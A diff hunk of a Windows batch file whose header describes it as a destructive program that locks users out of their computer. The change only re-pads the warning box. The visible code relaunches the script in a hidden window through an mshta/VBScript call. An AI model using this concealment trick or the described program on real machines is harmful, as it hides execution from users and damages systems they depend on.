@@ -1,12 +1,12 @@
 @echo off
-rem ---------------------------------------------------------------------- 
-rem | This program can prohibit you from using your computer.                                                |
-rem | !!!WARNING!!!: Please DO NOT run this program on your computer!!!                             |
-rem | !!!WARNING!!!: It is DESTRUCTIVE!!!                                                                                    |
-rem | !!!WARNING!!!: Please run this program on the VIRTUAL MACHINE!!!                         |
-rem | By @xiarimangguo // My Github: https://github.com/xiarimangguo/                                   |
-rem | If  you like this, don't forget to give me a star on Github!!!                                                   |
-rem ---------------------------------------------------------------------- 
+rem ----------------------------------------------------------------------
+rem | This program can prohibit you from using your computer.            |
+rem | !!!WARNING!!!: Please DO NOT run this program on your computer!!!  |
+rem | !!!WARNING!!!: It is DESTRUCTIVE!!!                                |
+rem | !!!WARNING!!!: Please run this program on the VIRTUAL MACHINE!!!   |
+rem | By @xiarimangguo // My Github: https://github.com/xiarimangguo/    |
+rem | If  you like this, don't forget to give me a star on Github!!!     |
+rem ----------------------------------------------------------------------
 rem Hide cmd window
 if "%1"=="hide" goto CmdBegin
 start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
